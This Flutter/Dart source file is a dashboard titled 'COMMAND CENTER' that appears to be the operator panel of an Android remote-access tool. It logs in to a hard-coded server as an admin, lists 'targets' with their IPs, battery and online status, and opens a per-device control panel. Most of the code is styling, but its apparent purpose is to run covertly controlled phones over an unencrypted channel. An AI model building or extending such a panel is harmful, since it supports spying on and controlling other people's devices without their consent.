import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'dart:math';
import 'dart:ui';
import 'package:video_player/video_player.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:font_awesome_flutter/font_awesome_flutter.dart';

class DeviceDashboardPage extends StatefulWidget {
  final String username; 

  const DeviceDashboardPage({super.key, required this.username});

  @override
  State<DeviceDashboardPage> createState() => _DeviceDashboardPageState();
}

class _DeviceDashboardPageState extends State<DeviceDashboardPage> with TickerProviderStateMixin {
  List<dynamic> _devices = [];
  bool _isLoading = true;
  Timer? _timer;

  late VideoPlayerController _videoController;
  bool _videoInitialized = false;
  bool _videoError = false;

  final TextEditingController _searchController = TextEditingController();
  String _searchQuery = "";
  
  // Socket untuk Real-Time
  late IO.Socket _socket;
  
  // Animation Controllers
  late AnimationController _glowController;
  late AnimationController _fadeController;
  late AnimationController _rotateController;
  late Animation<double> _glowAnimation;
  late Animation<double> _fadeAnimation;
  late Animation<double> _rotateAnimation;

  // GLOWING GREY THEME
  final Color _primaryColor = const Color(0xFFB8B8CC);
  final Color _secondaryColor = const Color(0xFF787890);
  final Color _accentColor = const Color(0xFFD8D8EC);
  final Color _successColor = const Color(0xFF8899AA);
  final Color _warningColor = const Color(0xFFC8B890);
  final Color _darkBg = const Color(0xFF0C0C10);
  final Color _darkerBg = const Color(0xFF070709);
  final Color _surfaceColor = const Color(0xFF161620);
  final Color _cardColor = const Color(0xFF111118);
  final Color _glowColor1 = const Color(0xFFE0E0F8);
  final Color _glowColor2 = const Color(0xFF9090B4);
  final Color _glowColor3 = const Color(0xFFBBBBD0);
  final Color _goldColor = const Color(0xFFCCBB88);
  final Color _roseColor = const Color(0xFFBB8899);

  @override
  void initState() {
    super.initState();
    _initializeAnimations();
    _initializeVideo();
    _fetchDevices();
    _initSocket();
    
    _timer = Timer.periodic(const Duration(seconds: 10), (timer) {
      if (mounted) setState(() {});
    });
    
    _searchController.addListener(() {
      setState(() {
        _searchQuery = _searchController.text;
      });
    });
  }

  void _initializeAnimations() {
    _glowController = AnimationController(
      duration: const Duration(milliseconds: 2500),
      vsync: this,
    );
    _glowController.repeat(reverse: true);
    _glowAnimation = Tween<double>(begin: 0.3, end: 1.0).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOutSine),
    );

    _fadeController = AnimationController(
      duration: const Duration(milliseconds: 1200),
      vsync: this,
    );
    _fadeAnimation = Tween<double>(begin: 0.0, end: 1.0).animate(
      CurvedAnimation(parent: _fadeController, curve: Curves.easeOutCubic),
    );
    _fadeController.forward();

    _rotateController = AnimationController(
      duration: const Duration(seconds: 20),
      vsync: this,
    );
    _rotateController.repeat();
    _rotateAnimation = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _rotateController, curve: Curves.linear),
    );
  }

  void _initSocket() {
    try {
      _socket = IO.io(
        'http://kinncloud.sistems.tech:2052',
        IO.OptionBuilder()
            .setTransports(['websocket'])
            .setQuery({'type': 'admin', 'id': 'ADMIN_PANEL_${widget.username}'})
            .enableAutoConnect()
            .build(),
      );

      _socket.onConnect((_) {
        debugPrint("[+] Admin Socket Connected to Dashboard");
      });

      _socket.on('target_status', (data) {
        if (mounted) {
          setState(() {
            int index = _devices.indexWhere((d) => d['id'] == data['id']);
            if (index != -1) {
              _devices[index]['status'] = data['status'].toString().toLowerCase() == 'online' ? 'Online' : 'Offline';
              if (data['status'].toString().toLowerCase() == 'online') {
                _devices[index]['lastSeen'] = DateTime.now().toIso8601String();
              }
            }
          });
        }
      });

      _socket.on('heartbeat', (data) {
        if (mounted) {
          setState(() {
            int index = _devices.indexWhere((d) => d['id'] == data['deviceId']);
            if (index != -1) {
              _devices[index]['battery'] = data['battery'];
              _devices[index]['status'] = 'Online';
              _devices[index]['lastSeen'] = DateTime.now().toIso8601String();
            }
          });
        }
      });

      _socket.on('device_info', (data) {
        if (mounted && data['admin'] == widget.username) {
          _fetchDevices();
        }
      });

      _socket.connect();
    } catch (e) {
      debugPrint("Socket error: $e");
    }
  }

  void _initializeVideo() {
    try {
      _videoController = VideoPlayerController.asset('assets/videos/banner.mp4')
        ..initialize().then((_) {
          if (mounted) {
            setState(() {
              _videoInitialized = true;
            });
            _videoController.setLooping(true);
            _videoController.play();
            _videoController.setVolume(0);
          }
        }).catchError((error) {
          debugPrint('Video initialization error: $error');
          if (mounted) setState(() => _videoError = true);
        });
    } catch (e) {
      debugPrint('Video controller creation error: $e');
      if (mounted) setState(() => _videoError = true);
    }
  }

  Widget _buildAnimatedBackground() {
    return Stack(
      children: [
        if (_videoInitialized && !_videoError)
          SizedBox.expand(
            child: FittedBox(
              fit: BoxFit.cover,
              child: SizedBox(
                width: _videoController.value.size.width,
                height: _videoController.value.size.height,
                child: Opacity(opacity: 0.06, child: VideoPlayer(_videoController)),
              ),
            ),
          )
        else
          Container(
            decoration: BoxDecoration(
              gradient: RadialGradient(
                center: const Alignment(-0.2, -0.4),
                radius: 1.6,
                colors: [_glowColor1.withOpacity(0.05), _darkerBg, _darkBg],
              ),
            ),
          ),

        // Rotating rings
        AnimatedBuilder(
          animation: _rotateAnimation,
          builder: (context, _) {
            final size = MediaQuery.of(context).size;
            return Stack(
              children: [
                Positioned(
                  bottom: -size.height * 0.15,
                  right: -size.width * 0.2,
                  child: Transform.rotate(
                    angle: _rotateAnimation.value * pi * 2,
                    child: Container(
                      width: size.width * 0.7,
                      height: size.width * 0.7,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        border: Border.all(color: _glowColor1.withOpacity(0.05), width: 1),
                      ),
                    ),
                  ),
                ),
                Positioned(
                  top: -size.height * 0.08,
                  left: -size.width * 0.15,
                  child: Transform.rotate(
                    angle: -_rotateAnimation.value * pi,
                    child: Container(
                      width: size.width * 0.5,
                      height: size.width * 0.5,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        border: Border.all(color: _glowColor2.withOpacity(0.06), width: 0.8),
                      ),
                    ),
                  ),
                ),
              ],
            );
          },
        ),

        // Vignette
        Container(
          decoration: BoxDecoration(
            gradient: RadialGradient(
              center: Alignment.center,
              radius: 1.0,
              colors: [
                Colors.transparent,
                Colors.black.withOpacity(0.55),
              ],
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildGlassCard({required Widget child}) {
    return Container(
      decoration: BoxDecoration(
        color: _cardColor,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _glowColor1.withOpacity(0.12), width: 1),
        boxShadow: [
          BoxShadow(color: Colors.black.withOpacity(0.3), blurRadius: 16, offset: const Offset(0, 6)),
        ],
      ),
      child: child,
    );
  }

  @override
  void dispose() {
    _timer?.cancel();
    _socket.disconnect();
    _socket.dispose();
    _videoController.dispose();
    _searchController.dispose();
    _glowController.dispose();
    _fadeController.dispose();
    _rotateController.dispose();
    super.dispose();
  }

  Future<void> _fetchDevices() async {
    try {
      final response = await http.get(
        Uri.parse("http://kinncloud.sistems.tech:2052/api/list-targets?username=${widget.username}"),
      );

      if (response.statusCode == 200) {
        if (mounted) {
          setState(() {
            _devices = jsonDecode(response.body);
            _isLoading = false;
          });
        }
      }
    } catch (e) {
      debugPrint("Error fetching devices: $e");
      if (mounted) {
        setState(() => _isLoading = false);
      }
    }
  }

  List<dynamic> get _filteredDevices {
    if (_searchQuery.isEmpty) return _devices;
    return _devices.where((d) {
      String searchStr = "${d['model']} ${d['id']} ${d['ip']}".toLowerCase();
      return searchStr.contains(_searchQuery.toLowerCase());
    }).toList();
  }

  bool _isDeviceReallyOnline(dynamic device) {
    if (device['status'] == 'Offline') return false;
    if (device['lastSeen'] == null) return false;

    try {
      DateTime lastSeen = DateTime.parse(device['lastSeen'].toString());
      DateTime now = DateTime.now();
      
      if (now.difference(lastSeen).inSeconds > 20) {
        return false;
      }
      return true;
    } catch (e) {
      return false;
    }
  }

  Widget _buildNeonHeader() {
    return Padding(
      padding: const EdgeInsets.fromLTRB(20, 16, 20, 8),
      child: AnimatedBuilder(
        animation: _glowAnimation,
        builder: (context, _) {
          return Container(
            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 16),
            decoration: BoxDecoration(
              color: _cardColor,
              borderRadius: BorderRadius.circular(24),
              border: Border.all(color: _glowColor1.withOpacity(0.3), width: 1.5),
              boxShadow: [
                BoxShadow(
                  color: _glowColor1.withOpacity(0.12 * _glowAnimation.value),
                  blurRadius: 20,
                  spreadRadius: 2,
                ),
              ],
            ),
            child: Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(12),
                  decoration: BoxDecoration(
                    color: _glowColor1.withOpacity(0.1),
                    borderRadius: BorderRadius.circular(14),
                    border: Border.all(color: _glowColor1.withOpacity(0.2), width: 1),
                  ),
                  child: const Icon(Icons.security, color: Color(0xFFE0E0F8), size: 22),
                ),
                const SizedBox(width: 16),
                Expanded(
                  child: Column(
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      ShaderMask(
                        shaderCallback: (bounds) => LinearGradient(
                          colors: [_glowColor1, _accentColor, _glowColor2],
                        ).createShader(bounds),
                        child: const Text(
                          "COMMAND CENTER",
                          style: TextStyle(
                            color: Colors.white,
                            fontSize: 18,
                            fontWeight: FontWeight.w900,
                            fontFamily: "Rajdhani",
                            letterSpacing: 3,
                          ),
                        ),
                      ),
                      const SizedBox(height: 4),
                      Text(
                        "Device Management - ${widget.username.toUpperCase()}",
                        style: TextStyle(
                          color: _glowColor2.withOpacity(0.7),
                          fontSize: 10,
                          fontFamily: "Rajdhani",
                          fontWeight: FontWeight.w600,
                          letterSpacing: 1,
                        ),
                      ),
                    ],
                  ),
                ),
                GestureDetector(
                  onTap: () {
                    setState(() => _isLoading = true);
                    _fetchDevices();
                  },
                  child: Container(
                    padding: const EdgeInsets.all(10),
                    decoration: BoxDecoration(
                      color: _glowColor1.withOpacity(0.08),
                      shape: BoxShape.circle,
                      border: Border.all(color: _glowColor1.withOpacity(0.2), width: 1),
                    ),
                    child: Icon(Icons.refresh, color: _glowColor1, size: 20),
                  ),
                ),
              ],
            ),
          );
        },
      ),
    );
  }

  Widget _buildStatBox(String title, String value, Color valueColor) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 14),
        decoration: BoxDecoration(
          color: _cardColor,
          borderRadius: BorderRadius.circular(16),
          border: Border.all(color: valueColor.withOpacity(0.2), width: 1),
        ),
        child: Column(
          children: [
            Text(
              value,
              style: TextStyle(
                color: valueColor,
                fontSize: 20,
                fontWeight: FontWeight.w800,
                fontFamily: "Rajdhani",
                letterSpacing: 1,
                shadows: [Shadow(color: valueColor.withOpacity(0.4), blurRadius: 8)],
              ),
            ),
            const SizedBox(height: 4),
            Text(
              title,
              style: TextStyle(
                color: Colors.white.withOpacity(0.4),
                fontSize: 9,
                fontWeight: FontWeight.w700,
                letterSpacing: 2,
                fontFamily: "Rajdhani",
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildSearchBar() {
    return Container(
      decoration: BoxDecoration(
        color: _cardColor,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: _glowColor1.withOpacity(0.15), width: 1),
      ),
      child: TextField(
        controller: _searchController,
        style: TextStyle(color: Colors.white.withOpacity(0.9), fontSize: 13, fontFamily: 'Rajdhani', fontWeight: FontWeight.w600),
        decoration: InputDecoration(
          hintText: "Search device, IP, ID...",
          hintStyle: TextStyle(color: Colors.white.withOpacity(0.3), fontSize: 12, fontFamily: 'Rajdhani'),
          prefixIcon: Icon(Icons.search, color: _glowColor2.withOpacity(0.5), size: 18),
          border: InputBorder.none,
          contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
        ),
      ),
    );
  }

  Widget _buildDeviceCard(dynamic device, int index) {
    bool isActive = _isDeviceReallyOnline(device); 
    Color statusColor = isActive ? _successColor : _roseColor;
    
    return GestureDetector(
      onTap: () {
        Navigator.pushNamed(
          context, 
          '/control_panel', 
          arguments: {
            "device": device,
            "operator": widget.username
          } 
        );
      },
      child: Container(
        margin: const EdgeInsets.only(bottom: 12),
        padding: const EdgeInsets.all(16),
        decoration: BoxDecoration(
          color: _cardColor,
          borderRadius: BorderRadius.circular(20),
          border: Border.all(
            color: statusColor.withOpacity(isActive ? 0.3 : 0.1),
            width: isActive ? 1.2 : 1,
          ),
          boxShadow: isActive ? [
            BoxShadow(
              color: statusColor.withOpacity(0.08),
              blurRadius: 16,
              spreadRadius: 1,
            )
          ] : [],
        ),
        child: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(12),
              decoration: BoxDecoration(
                color: statusColor.withOpacity(0.1),
                borderRadius: BorderRadius.circular(14),
                border: Border.all(
                  color: statusColor.withOpacity(0.25),
                  width: 1,
                ),
              ),
              child: Icon(Icons.phone_android, color: statusColor, size: 20),
            ),
            const SizedBox(width: 16),
            
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    device['model'] ?? "Unknown Device",
                    style: const TextStyle(
                      color: Colors.white,
                      fontSize: 14,
                      fontWeight: FontWeight.w800,
                      fontFamily: "Rajdhani",
                      letterSpacing: 1,
                    ),
                    maxLines: 1,
                    overflow: TextOverflow.ellipsis,
                  ),
                  const SizedBox(height: 4),
                  Row(
                    children: [
                      Text(
                        device['release'] != null ? "Android ${device['release']}" : "Android OS",
                        style: TextStyle(color: Colors.white.withOpacity(0.45), fontSize: 10, fontFamily: "Rajdhani", fontWeight: FontWeight.w500),
                      ),
                      const SizedBox(width: 8),
                      Icon(FontAwesomeIcons.wifi, color: Colors.white.withOpacity(0.2), size: 10),
                    ],
                  ),
                ],
              ),
            ),

            Column(
              crossAxisAlignment: CrossAxisAlignment.end,
              children: [
                Row(
                  children: [
                    Container(
                      width: 6,
                      height: 6,
                      decoration: BoxDecoration(
                        color: statusColor,
                        shape: BoxShape.circle,
                        boxShadow: [
                          BoxShadow(color: statusColor.withOpacity(0.4), blurRadius: 4)
                        ]
                      ),
                    ),
                    const SizedBox(width: 6),
                    Text(
                      isActive ? "Online" : "Offline",
                      style: TextStyle(
                        color: isActive ? _successColor : Colors.white.withOpacity(0.5),
                        fontSize: 10,
                        fontWeight: FontWeight.w700,
                        fontFamily: "Rajdhani",
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 6),
                Row(
                  children: [
                    Icon(Icons.battery_charging_full, color: Colors.white.withOpacity(0.3), size: 10),
                    const SizedBox(width: 4),
                    Text(
                      "${device['battery'] ?? '0'}%", 
                      style: TextStyle(color: Colors.white.withOpacity(0.4), fontSize: 9, fontFamily: "Rajdhani", fontWeight: FontWeight.w500)
                    ),
                  ],
                ),
              ],
            ),
            
            const SizedBox(width: 12),
            Icon(Icons.arrow_forward_ios, color: Colors.white.withOpacity(0.15), size: 12),
          ],
        ),
      ),
    );
  }

  Widget _buildFooter() {
    return Column(
      children: [
        Container(
          height: 1,
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [Colors.transparent, _glowColor1.withOpacity(0.1), Colors.transparent],
            ),
          ),
        ),
        const SizedBox(height: 12),
        Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            _buildFooterDot(_successColor),
            const SizedBox(width: 8),
            _buildFooterText("ACTIVE"),
            const SizedBox(width: 20),
            Container(width: 1, height: 10, color: Colors.white.withOpacity(0.06)),
            const SizedBox(width: 20),
            Icon(Icons.fingerprint, color: Colors.white.withOpacity(0.12), size: 12),
            const SizedBox(width: 20),
            _buildFooterDot(_glowColor2),
            const SizedBox(width: 8),
            _buildFooterText("SECURE"),
          ],
        ),
        const SizedBox(height: 8),
        Text(
          "VANTHRA • DEVICE MANAGEMENT",
          style: TextStyle(
            color: Colors.white.withOpacity(0.1),
            fontSize: 8,
            letterSpacing: 3,
            fontFamily: 'Rajdhani',
            fontWeight: FontWeight.w600,
          ),
        ),
      ],
    );
  }

  Widget _buildFooterDot(Color color) {
    return Container(
      width: 5,
      height: 5,
      decoration: BoxDecoration(
        color: color,
        shape: BoxShape.circle,
        boxShadow: [BoxShadow(color: color, blurRadius: 5)],
      ),
    );
  }

  Widget _buildFooterText(String text) {
    return Text(
      text,
      style: TextStyle(
        color: Colors.white.withOpacity(0.25),
        fontSize: 8,
        fontWeight: FontWeight.w700,
        letterSpacing: 2.5,
        fontFamily: 'Rajdhani',
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    int totalCount = _devices.length;
    int activeCount = _devices.where((d) => _isDeviceReallyOnline(d)).length; 
    int offlineCount = totalCount - activeCount;
    final filteredList = _filteredDevices;

    return Scaffold(
      backgroundColor: _darkerBg,
      body: Stack(
        children: [
          _buildAnimatedBackground(),
          SafeArea(
            child: Column(
              children: [
                _buildNeonHeader(),
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 10),
                  child: Row(
                    children: [
                      _buildStatBox("TOTAL", totalCount.toString(), _glowColor1),
                      const SizedBox(width: 12),
                      _buildStatBox("ONLINE", activeCount.toString(), _successColor),
                      const SizedBox(width: 12),
                      _buildStatBox("OFFLINE", offlineCount.toString(), _roseColor),
                    ],
                  ),
                ),
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
                  child: _buildSearchBar(),
                ),
                const SizedBox(height: 8),
                Expanded(
                  child: _isLoading 
                    ? const Center(child: CircularProgressIndicator(color: Color(0xFFE0E0F8), strokeWidth: 3))
                    : filteredList.isEmpty 
                      ? Center(
                          child: Text(
                            "NO DEVICES FOUND", 
                            style: TextStyle(
                              color: Colors.white.withOpacity(0.35),
                              fontWeight: FontWeight.w800,
                              letterSpacing: 3,
                              fontFamily: "Rajdhani",
                              fontSize: 14,
                            ),
                          ),
                        )
                      : FadeTransition(
                          opacity: _fadeAnimation,
                          child: ListView.builder(
                            padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
                            itemCount: filteredList.length,
                            itemBuilder: (context, index) {
                              final device = filteredList[index];
                              return _buildDeviceCard(device, index);
                            },
                          ),
                        ),
                ),
                _buildFooter(),
                const SizedBox(height: 16),
              ],
            ),
          ),
        ],
      ),
    );
  }
}